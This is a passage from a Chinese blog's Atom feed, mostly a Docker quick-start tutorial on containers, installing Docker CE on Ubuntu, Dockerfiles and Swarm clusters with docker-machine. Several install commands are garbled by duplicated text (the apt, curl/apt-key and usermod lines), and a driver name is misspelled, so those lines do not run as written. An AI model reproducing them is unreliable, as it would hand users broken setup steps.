的性能，又会占用大量的磁盘空间。<br>因此如果不必要，应尽可能的少开启日志，根据不同的使用环境，考虑开启不同的日志。</p><p>例如：在开发环境中优化查询低效率的语句，可以开启慢查询日志；<br>如果需要记录用的所有查询操作，可以开启通用查询日志；<br>如果需要记录数据的变更，可以开启二进制日志；<br>错误日志默认开启；</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;日志无论在哪里都是尤为重要的存在，所以这篇笔记的目的就是了解Mysql 日志的。&lt;/p&gt;</summary>
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>Docker 快速上手</title>
    <link href="https://www.0x2beace.com/docker-quick-start/"/>
    <id>https://www.0x2beace.com/docker-quick-start/</id>
    <published>2020-07-23T04:32:57.000Z</published>
    <updated>2020-08-22T01:02:14.223Z</updated>
    
    <content type="html"><![CDATA[<p>这篇笔记的主要目的是用来记录学习 <code>Docker</code> 的过程。<code>Docker</code>这个词并不是第一次听说了，印象中好久以前就听说过这个东西了，只是一直没有真正去了解。</p><a id="more"></a><h2 id="诞生"><a href="#诞生" class="headerlink" title="诞生"></a>诞生</h2><p>软件开发最大的麻烦事之一，就是环境配置。</p><p>开发者常常说的一句话：它在我的机器上可以跑了。言下之意就是，其他机器可能跑不了。因为可以正常跑的前提是：操作系统的设置，各种软件和组件、库的安装，只有它们都正确了，软件才能正常运行。</p><p>配置环境如此麻烦，换一台机器，就得重来一次，旷日费时。因此，聪明的人们就想到，能不能从根本上解决问题。软件可以带环境安装。（这里说的软件是指最终要运行的工程）</p><h2 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h2><p>虚拟机（virtual machine，简称VM）就是带环境安装的一种解决方案。它可以在一个操作系统中运行另外一种操作系统。比如在Windows系统中运行Linux 系统。应用程序对此毫无感觉，因为虚拟机看上去跟真是系统一模一样。而对于底层系统来说，虚拟机就是一个普通文件，不需要就删掉，对其他部分没有影响。</p><p><strong>虚拟机（VM）是物理硬件的抽象，</strong> 将一台服务器转变为多台服务器。</p><p>虽然用户可以通过虚拟机还原软件的原始环境，但是这个方案有几个缺点。在后面会做比较。</p><h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><p>由于虚拟机存在一些缺点，Linux 发展出了另一种轻量级的操作系统虚拟化解决方案，Linux 容器（Linux Containers，缩写为 LXC）。</p><p><strong>Linux 容器不是模拟一个完整的操作系统，而是对进程进行隔离。</strong></p><p><strong>容器是应用层的抽象，它将代码和依赖关系打包在一起。</strong> 多个容器可以在同一台机器上运行，并与其他容器共享操作系统内核，每个容器在用户空间中作为独立进程运行。容器占用的空间比VM少（容器映像的大小通常为几十MB），可以处理更多的应用程序，并且需要更少的VM和操作系统。</p><p>由于容器是进程级别的，相比虚拟机有很多的优势。后面会做比较。</p><h2 id="Docker-是什么"><a href="#Docker-是什么" class="headerlink" title="Docker 是什么"></a>Docker 是什么</h2><p><strong>Docker 属于Linux 容器的一种封装，提供简单易用的容器使用接口。</strong> 它是目前最流行的 Linux 容器解决方案。</p><h3 id="Docker-与虚拟机的区别"><a href="#Docker-与虚拟机的区别" class="headerlink" title="Docker 与虚拟机的区别"></a>Docker 与虚拟机的区别</h3><table><thead><tr><th>名称</th><th>占用资源</th><th>启动速度</th><th>级别</th></tr></thead><tbody><tr><td>Docker</td><td>占用资源少</td><td>启动快</td><td>轻量级</td></tr><tr><td>虚拟机</td><td>占用资源多</td><td>启动慢</td><td>重量级</td></tr></tbody></table><h3 id="Docker-CE-与-Docker-EE"><a href="#Docker-CE-与-Docker-EE" class="headerlink" title="Docker CE 与 Docker EE"></a>Docker CE 与 Docker EE</h3><p><strong>Docker CE(Docker Community Edition)</strong> 是社区版，简单理解是免费使用，提供小企业与小的IT团队使用,希望从Docker开始，并尝试基于容器的应用程序部署。</p><p><strong>Docker EE(Docker Enterprise Edition)</strong> 是企业版，收费。提供功能更强。适合大企业与打的IT团队。为企业开发和IT团队设计，他们在生产中构建、交付和运行业务关键应用程序</p><p>Docker CE 有三种类型的更新通道：stable、test和 nightly</p><ul><li>Stable 提供一般可用性的最新版本</li><li>Test 提供在一般可用之前准备好进行测试的预发布。</li><li>Nightly 提供下一个主要版本的最新正在进行的工作。</li></ul><h2 id="安装-Docker-CE"><a href="#安装-Docker-CE" class="headerlink" title="安装 Docker-CE"></a>安装 Docker-CE</h2><p>这里以Ubuntu 18.04 为例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. sudo apt install apt-transport-https ca-certificates software-properties-common curl-transport-https ca-certificates software-properties-common curl</span><br><span class="line">2. curl -fsSL https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu&#x2F;gpg | sudo apt-key add --fsSL https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu&#x2F;gpg | sudo apt-key add -</span><br><span class="line">3. sudo add-apt-repository &quot;deb [arch&#x3D;amd64] https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu \-apt-repository &quot;deb [arch&#x3D;amd64] https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu \</span><br><span class="line">$(lsb_release -cs) stable&quot;</span><br><span class="line">4. sudo apt update</span><br><span class="line">5. sudo apt install docker-ce</span><br></pre></td></tr></table></figure><p>将当前用户添加到docker 用户组，可以不用sudo 运行docker</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo groupadd docker</span><br><span class="line">$ sudo usermod -aG docker $USER-aG docker $USER</span><br></pre></td></tr></table></figure><h3 id="Docker-镜像"><a href="#Docker-镜像" class="headerlink" title="Docker 镜像"></a>Docker 镜像</h3><p>Docker 镜像就是一个只读的模板。</p><p>例如：一个镜像可以包含一个完整的 ubuntu 操作系统环境，里面仅安装了 Apache 或用户需要的其它应用程序。</p><p>镜像可以用来创建 Docker 容器。</p><h3 id="Docker-容器"><a href="#Docker-容器" class="headerlink" title="Docker 容器"></a>Docker 容器</h3><p>Docker 利用容器来运行应用。</p><p>容器是从镜像创建的运行实例。它可以被启动、开始、停止、删除。每个容器都是相互隔离的、保证安全的平台。</p><p>可以把容器看做是一个简易版的 Linux 环境（包括root用户权限、进程空间、用户空间和网络空间等）和运行在其中的应用程序。</p><blockquote><p>注：镜像是只读的，容器在启动的时候创建一层可写层作为最上层。</p></blockquote><h3 id="Docker-仓库"><a href="#Docker-仓库" class="headerlink" title="Docker 仓库"></a>Docker 仓库</h3><p>仓库是集中存放镜像文件的场所。有时候会把仓库和仓库注册服务器（Registry）混为一谈，并不严格区分。实际上，仓库注册服务器上往往存放着多个仓库，每个仓库中又包含了多个镜像（image），每个镜像有不同的标签（tag）。</p><p>仓库分为公开仓库（Public）和私有仓库（Private）两种形式。</p><p>最大的公开仓库是 Docker Hub，存放了数量庞大的镜像供用户下载。 国内的公开仓库包括 Docker Pool 等，可以提供大陆用户更稳定快速的访问。</p><p>当然，用户也可以在本地网络内创建一个私有仓库。</p><p>当用户创建了自己的镜像之后就可以使用 push 命令将它上传到公有或者私有仓库，这样下次在另外一台机器上使用这个镜像时候，只需要从仓库上 pull 下来就可以了。</p><blockquote><p>注：Docker 仓库的概念跟 Git 类似，注册服务器可以理解为 GitHub 这样的托管服务。</p></blockquote><h4 id="镜像和容器的区别"><a href="#镜像和容器的区别" class="headerlink" title="镜像和容器的区别"></a>镜像和容器的区别</h4><p>容器和镜像的关系如下：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200723123056.png" alt=""></p><p><code>Dockerfile</code>用于定义镜像，依赖镜像来运行容器，仓库则是存放镜像的地方。</p><h4 id="Dockerfile-是什么？"><a href="#Dockerfile-是什么？" class="headerlink" title="Dockerfile 是什么？"></a>Dockerfile 是什么？</h4><p>Dockerfile 是一个创建Docker 镜像所需的文件，其中会包含一组指令来告诉Docker 如何构建我们的镜像。</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ cat Dockerfile</span><br><span class="line"># 使用官方Python运行时作为父映像</span><br><span class="line">FROM python:2.7-slim</span><br><span class="line"></span><br><span class="line"># 将工作目录设置为&#x2F;app</span><br><span class="line">WORKDIR &#x2F;app</span><br><span class="line"></span><br><span class="line"># 将当前目录内容复制到容器at &#x2F;app</span><br><span class="line">COPY . &#x2F;app</span><br><span class="line"></span><br><span class="line"># 安装requirements.txt中指定的任何需要的包</span><br><span class="line">RUN pip install --trusted-host pypi.python.org -r requirements.txt</span><br><span class="line"></span><br><span class="line"># #让80 端口号对外开放</span><br><span class="line">EXPOSE 80</span><br><span class="line"></span><br><span class="line"># 定义环境变量</span><br><span class="line">ENV NAME World</span><br><span class="line"></span><br><span class="line"># 在容器启动时运行app.py</span><br><span class="line">CMD [&quot;python&quot;, &quot;app.py&quot;]</span><br></pre></td></tr></table></figure><h4 id="如何用镜像创建一个容器？"><a href="#如何用镜像创建一个容器？" class="headerlink" title="如何用镜像创建一个容器？"></a>如何用镜像创建一个容器？</h4><p>首先，我们需要一个镜像，然后才能创建容器。想要在Docker 上创建一个镜像，非常简单。</p><ol><li>cd 到项目文件夹中</li><li>使用 <code>docker build --tag=mydockerapp .</code> 命令，创建一个Docker 镜像。–tag 选项命名。</li><li>使用 <code>docker run -d -p 4000:80 mydockerapp</code>命令，创建一个新容器。</li></ol><p>该命令表示：Docker 以<code>mydockerapp</code>镜像创建一个新容器，同时以分离模式在后台运行该应用程序，将该容器的80端口映射到主机的4000端口。</p><p>其中：<br><code>-d</code>：让容器在后台运行<br><code>-p</code>：将容器内部端口映射到指定的主机端口上。<br><code>-P</code> :是容器内部端口随机映射到主机的端口上。</p><h4 id="Docker-网络端口映射"><a href="#Docker-网络端口映射" class="headerlink" title="Docker 网络端口映射"></a>Docker 网络端口映射</h4><p>使用命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -p 4000:80 mydocker</span><br></pre></td></tr></table></figure><p>然后用<code>docker container ls</code>查看容器列表</p><p>下图的意思表示：将该容器的端口80映射到4000，从而生成正确的URL <a href="http://localhost:4000。">http://localhost:4000。</a></p><p>Docker 开放了 80 端口映射到主机端口 4000 上。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200723123121.png" alt=""></p><h4 id="Docker-容器连接"><a href="#Docker-容器连接" class="headerlink" title="Docker 容器连接"></a>Docker 容器连接</h4><p>前面我们实现了通过网络端口来访问运行在 docker 容器内的服务。下面我们来实现通过端口连接到一个 docker 容器</p><h4 id="如何运行负载均衡应用？"><a href="#如何运行负载均衡应用？" class="headerlink" title="如何运行负载均衡应用？"></a>如何运行负载均衡应用？</h4><p>在开始之前，你得首先满足以下条件：</p><ol><li>安装Docker 1.13或更高版本。</li><li>了解如何创建容器。</li><li>确保已经创建镜像并发布到注册表。我们在这里需要使用该共享镜像。</li><li>确保镜像作为已部署的容器运行，并能访问。</li></ol><p>确保有<code>docker-compose.yml</code>配置文件，然后依次执行以下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ docker swarm init</span><br><span class="line">$ docker stack deploy -c docker-compose.yml getstartedlab</span><br><span class="line"># 顺利的话，就能直接部署成功了。使用docker container ls 可以看到正在运行的实例。</span><br><span class="line"># 使用 curl http:&#x2F;&#x2F;localhost:4000 或者是刷新浏览器。</span><br><span class="line"># 无论以哪种方式，容器ID 都会发生变化。从而证明负载均衡成功。</span><br><span class="line"># 对于每个请求，以循环方式选择5个任务中的一个来响应。</span><br><span class="line"># 容器ID与上一个命令（docker container ls -q）的输出匹配。</span><br></pre></td></tr></table></figure><h4 id="关于服务"><a href="#关于服务" class="headerlink" title="关于服务"></a>关于服务</h4><p>在分布式应用程序中，应用程序的不同部分称为“服务”。例如，如果您想象一个视频共享站点，它可能包括一个用于在数据库中存储应用程序数据的服务，一个用户在上传内容后在后台进行视频转码的服务，一个用于前端的服务，等等。</p><p>服务实际上只是“生产中的容器”。服务只运行一个镜像，但它编码了镜像运行的方式 - 它应该使用哪些端口，应该运行多少个容器副本，以便服务具有所需的容量，以及等等。扩展服务会更改运行该软件的容器实例的数量，从而为流程中的服务分配更多计算资源。</p><p>在服务中运行的单个容器称为任务。任务被赋予以数字递增的唯一ID，最多为replicas您定义 的数量docker-compose.yml。</p><p>幸运的是，使用Docker平台定义，运行和扩展服务非常容易 - 只需编写一个docker-compose.yml文件即可。</p><h4 id="如何在Docker上安装-Docker-Machine？"><a href="#如何在Docker上安装-Docker-Machine？" class="headerlink" title="如何在Docker上安装 Docker Machine？"></a>如何在Docker上安装 Docker Machine？</h4><p>Ubuntu 18.04 请看文末的参考链接。</p><p>MacOS 如果是从<a href="https://hub.docker.com/" target="_blank" rel="noopener"><code>DockerHub</code>官网</a>下载的<code>dmg</code> 安装的Docker，不用担心，<code>Docker-Machine</code> 已经安装好了。</p><h4 id="如何安装VirtualBox？"><a href="#如何安装VirtualBox？" class="headerlink" title="如何安装VirtualBox？"></a>如何安装VirtualBox？</h4><p>Ubuntu 18.04 请看文末的参考链接。</p><p>MacOS 则需要从<a href="https://www.virtualbox.org/wiki/Downloads" target="_blank" rel="noopener"><code>virtualbox</code>官网</a>下载dmg安装包。</p><p>你可能会遇到一个错误，参考解决：<a href="http://osxdaily.com/2018/12/31/install-run-virtualbox-macos-install-kernel-fails/" target="_blank" rel="noopener">如何在MacOS上安装VirtualBox</a></p><h3 id="了解Swarm集群"><a href="#了解Swarm集群" class="headerlink" title="了解Swarm集群"></a>了解Swarm集群</h3><p>群由多个节点组成，可以是物理或虚拟机。基本概念很简单：运行<code>docker swarm init</code>以启用<code>swarm模式</code>并使当前计算机成为一个<code>swarm管理器</code>。</p><p>这个章节是这个文档系列中学的时间最长的，坑有点多，走了不少弯路，这一节也挺重要的 重点记下笔记。</p><p>在MacOS 下，部分命令需要 sudo 权限。</p><h4 id="创建一个集群（本地计算机的VM）"><a href="#创建一个集群（本地计算机的VM）" class="headerlink" title="创建一个集群（本地计算机的VM）"></a>创建一个集群（本地计算机的VM）</h4><p>在开始这部分之前，需要提前安装好<code>Oracle VirtualBox</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine create --driver virutalbox myvm1</span><br></pre></td></tr></table></figure><p>如果你收到了这样的信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ Error with pre-create check: </span><br><span class="line">&quot;VBoxManage not found. Make sure VirtualBox is installed and VBoxManage is in the path&quot;</span><br></pre></td></tr></table></figure><p>说明你的<code>Vritualbox</code>还是没有安装好。</p><p>查看正在运行的VM</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine ls</span><br><span class="line">NAME    ACTIVE   DRIVER       STATE     URL                         SWARM   DOCKER        ERRORS</span><br><span class="line">myvm1   -        virtualbox   Running   tcp:&#x2F;&#x2F;192.168.99.104:2376           v17.06.2-ce</span><br><span class="line">myvm2   -        virtualbox   Running   tcp:&#x2F;&#x2F;192.168.99.105:2376           v17.06.2-ce</span><br></pre></td></tr></table></figure><p>这样就成功的创建了一台VM，接下来我们要将这台机器作为管理器，第二台作为工作者。</p><p>另外值得一提的是，尽管我在Ubuntu 18.04 上分别安装好了docker-machine、virtualbox，但当我创建 VM 时，总是会提示我计算机没有开启什么虚拟化（BOIS）。</p><p>后来我大概想明白了，可能是我的那台服务器的配置太低了，真的是某个设置项没有启动导致的。</p><p>今天在MacBook 上重新操作了一边，异常顺利。</p><p>记录一个问题：使用<code>docker-machine create --driver virtualbox myvm1</code>创建VM时，创建成功了，但是并不是我想要的实例。得到了以下信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(default) Creating a new host-only adapter produced an error: hostonlyif create failed:</span><br><span class="line">(default) 0%...</span><br><span class="line">(default) Progress state: E_FAIL</span><br><span class="line">(default) VBoxManage.exe: error: Failed to create the host-only adapter</span><br></pre></td></tr></table></figure><p>找了好久也没有找到答案，最后是怎么解决的呢？重启机器（加上 sudo）。</p><p>启动\停止 VM</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine start Name</span><br><span class="line">$ docker-machine stop Name</span><br></pre></td></tr></table></figure><h4 id="初始化Swarm-并添加节点"><a href="#初始化Swarm-并添加节点" class="headerlink" title="初始化Swarm 并添加节点"></a>初始化Swarm 并添加节点</h4><p>这里是一个小坑，之前在这里栽了好久。</p><p>这里有两种方式初始化节点或者说操作 VM（推荐第一种）：</p><ol><li><p>ssh 连接VM 实例，在Docker VM Cli 中执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine ssh myvm1</span><br><span class="line">docker@myvm1: $ docker swarm init --advertise-addr &lt;myvm1 ip&gt;&quot;</span><br><span class="line"># &lt;myvm1 ip&gt; 指docker-machine ls 对应的 ip</span><br><span class="line"></span><br><span class="line"># 正常会得到这样一个输出</span><br><span class="line">To add a worker to this swarm, run the following command:</span><br><span class="line">   docker swarm join --token SWMTKN-1-1j5rwl5kvffwtptdl79vw30zfgqd51hrda8xmrkmv0lnozjii4-0njs1rk0zdplj70wjk6uhmkfo 192.168.99.103:2377</span><br></pre></td></tr></table></figure><h4 id="将myvm2-实例作为工作者加入（方式一）"><a href="#将myvm2-实例作为工作者加入（方式一）" class="headerlink" title="将myvm2 实例作为工作者加入（方式一）"></a>将myvm2 实例作为工作者加入（方式一）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine ssh myvm1</span><br><span class="line">docker@myvm1: $ docker swarm join </span><br><span class="line">--token SWMTKN-1-1j5rwl5kvffwtptdl79vw30zfgqd51hrda8xmrkmv0lnozjii4-0njs1rk0zdplj70wjk6uhmkfo </span><br><span class="line">192.168.99.103:2377</span><br><span class="line"></span><br><span class="line"># 成功，会得到这样的输出</span><br><span class="line">This node joined a swarm as a worker.</span><br></pre></td></tr></table></figure></li><li><p>直接通过 <code>docker-machine ssh myvm1</code> 执行相应命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine ssh myvm1 &quot;docker swarm init --advertise-addr &lt;myvm1 ip&gt;&quot;</span><br><span class="line"># 同上</span><br></pre></td></tr></table></figure><h4 id="将myvm2-实例作为工作者加入（方式二）"><a href="#将myvm2-实例作为工作者加入（方式二）" class="headerlink" title="将myvm2 实例作为工作者加入（方式二）"></a>将myvm2 实例作为工作者加入（方式二）</h4><p>执行上面得到的输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine ssh myvm2 &quot; docker swarm join </span><br><span class="line">--token SWMTKN-1-1j5rwl5kvffwtptdl79vw30zfgqd51hrda8xmrkmv0lnozjii4-0njs1rk0zdplj70wjk6uhmkfo </span><br><span class="line">192.168.99.103:2377&quot;</span><br><span class="line"></span><br><span class="line"># 成功，会得到这样的输出</span><br><span class="line">This node joined a swarm as a worker.</span><br></pre></td></tr></table></figure><p>这样，我们就成功的创建了一个集群，并将一个工作者作为一个节点加入了。</p></li></ol><h5 id="在管理器上查看集群中的节点："><a href="#在管理器上查看集群中的节点：" class="headerlink" title="在管理器上查看集群中的节点："></a>在管理器上查看集群中的节点：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker@myvm1: $ docker node ls</span><br><span class="line">ID                            HOSTNAME     STATUS       AVAILABILITY        MANAGER STATUS</span><br><span class="line">rihwohkh3ph38fhillhhb84sk *   myvm1        Ready        Active              Leader</span><br><span class="line">brtu9urxwfd5j0zrmkubhpkbd     myvm2        Ready        Active</span><br></pre></td></tr></table></figure><p>为什么上面要介绍那两种与 VM 实例进行交互的方式呢？</p><p>因为会和后面的在集群部署应用程序有一定联系。</p><h4 id="在集群中部署应用程序"><a href="#在集群中部署应用程序" class="headerlink" title="在集群中部署应用程序"></a>在集群中部署应用程序</h4><p>在开始部署之前，我们需要了解到有两种方式可以实现。</p><ol><li>docker-machine 为Swarm 管理器配置Shell</li></ol><p>到目前为止，我们与 VM 通信都是通过 <code>docker-machine ssh</code>这种方式，另一种更好的方式就是：将当前shell配置为与VM上的Docker守护程序通信。</p><p>这样我们就可以直接本地的<code>docker-compose.yml</code>文件远程部署应用程序，而无需将其复制到其他任何位置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine env myvm1</span><br><span class="line">export DOCKER_TLS_VERIFY&#x3D;&quot;1&quot;</span><br><span class="line">export DOCKER_HOST&#x3D;&quot;tcp:&#x2F;&#x2F;192.168.99.100:2376&quot;</span><br><span class="line">export DOCKER_CERT_PATH&#x3D;&quot;&#x2F;Users&#x2F;sam&#x2F;.docker&#x2F;machine&#x2F;machines&#x2F;myvm1&quot;</span><br><span class="line">export DOCKER_MACHINE_NAME&#x3D;&quot;myvm1&quot;</span><br><span class="line"># Run this command to configure your shell:</span><br><span class="line"># eval $(docker-machine env myvm1)</span><br><span class="line"></span><br><span class="line"># 运行最后一行命令以配置与之通信的 shell </span><br><span class="line">$ eval $(docker-machine env myvm1) # eval $(sudodocker-machine env myvm1)</span><br></pre></td></tr></table></figure><p>运行docker-machine ls 已验证 myvm1 现在是活动的计算机。带有星号（*）表示配置成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine ls</span><br><span class="line">NAME    ACTIVE   DRIVER       STATE     URL                         SWARM   DOCKER        ERRORS</span><br><span class="line">myvm1   *        virtualbox   Running   tcp:&#x2F;&#x2F;192.168.99.100:2376           v17.06.2-ce</span><br><span class="line">myvm2   -        virtualbox   Running   tcp:&#x2F;&#x2F;192.168.99.101:2376           v17.06.2-ce</span><br></pre></td></tr></table></figure><p>部署应用程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line">docker-compose.yml</span><br><span class="line">$ docker stack deploy -c docker-compose.yml getstartedlab</span><br></pre></td></tr></table></figure><ol start="2"><li>传统方式</li></ol><p>传统的方式就是将<code>docker-compose.yml</code>文件拷贝到对应的管理器中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 使用scp 命令将文件拷贝到 vm 实例中</span><br><span class="line">$ ls</span><br><span class="line">docker-compose.yml</span><br><span class="line">$ docker-machine scp docker-compose.yml myvm1:~</span><br></pre></td></tr></table></figure><p>部署应用程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 这里就可以随意选择使用之前介绍的方式一或者方式二</span><br><span class="line"></span><br><span class="line"># 方式一</span><br><span class="line">$ docker-machine ssh myvm1 &quot;docker stack deploy -c docker-compose.yml getstartedlab&quot;</span><br><span class="line"></span><br><span class="line"># 方式二</span><br><span class="line">$ docker-machine ssh myvm1</span><br><span class="line">docker@myvm1: $ docker stack deploy -c docker-compose.yml</span><br></pre></td></tr></table></figure><p>耐心等待一会，就可以看到看到部署成功了。</p><h4 id="访问集群"><a href="#访问集群" class="headerlink" title="访问集群"></a>访问集群</h4><p>在访问集群之前，你需要知道以下两件事：</p><ul><li>访问集群的IP 地址是VM 的IP，使用<code>docker-machine ls</code>查看</li><li>是否存在端口号，取决于你的<code>docker-compose.yml</code>文件</li></ul><h2 id="Docker-常用命令"><a href="#Docker-常用命令" class="headerlink" title="Docker 常用命令"></a>Docker 常用命令</h2><h3 id="容器的生命周期"><a href="#容器的生命周期" class="headerlink" title="容器的生命周期"></a>容器的生命周期</h3><p>创建一个新的容器并运行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</span><br><span class="line">$ docker run ubuntu:15.10 &#x2F;bin&#x2F;echo &quot;Hello world&quot;</span><br><span class="line"># 解释：Docker以ubuntu15.10镜像创建一个新容器，然后在容器里执行 bin&#x2F;echo &quot;Hello world&quot;，最后输出结果。</span><br><span class="line"></span><br><span class="line">参数</span><br><span class="line">* -d：让容器在后台运行</span><br><span class="line">* -p：内部容器绑定到指定的主机端口上</span><br><span class="line">* -P：内部容器端口随机映射到主机端口上</span><br><span class="line">* --name：给容器命名，如果不加--name 参数，Docker 会自动命名。</span><br></pre></td></tr></table></figure><p>杀掉一个运行中的容器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker kill -s KILL mydocker</span><br><span class="line"># mydocker 表示Contianer ID或者Name</span><br></pre></td></tr></table></figure><p>结束停止一个运行中的容器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker container stop mydocker</span><br><span class="line"># mydocker 表示Container ID或者Name</span><br></pre></td></tr></table></figure><p>查看正在运行的容器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ docker ps</span><br><span class="line"></span><br><span class="line">参数</span><br><span class="line">* -l：查询最后一次创建容器记录</span><br><span class="line">* --all：查询所有创建容器记录</span><br><span class="line">* -aq：查询所有创建容器的Container ID</span><br></pre></td></tr></table></figure><p>停止Web 应用容器</p><p>这个只是停止该容器的运行，并没有杀死</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker stop mydocker</span><br></pre></td></tr></table></figure><p>启动Web 应用容器</p><p>已经停止的容器，可以使用命令 docker start 来启动。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker start mydocker</span><br></pre></td></tr></table></figure><p>移除Web 应用容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker rm mydocker</span><br><span class="line">mydocker</span><br><span class="line"># 删除容器时，容器必须是停止状态，否者会报错。</span><br></pre></td></tr></table></figure><h3 id="镜像操作"><a href="#镜像操作" class="headerlink" title="镜像操作"></a>镜像操作</h3><p>如何创建一个Docker 镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker build --tag&#x3D;mydockerapp # 注意：标签名只能小写</span><br></pre></td></tr></table></figure><p>列出下载到计算机中的镜像</p><figure class="highlight 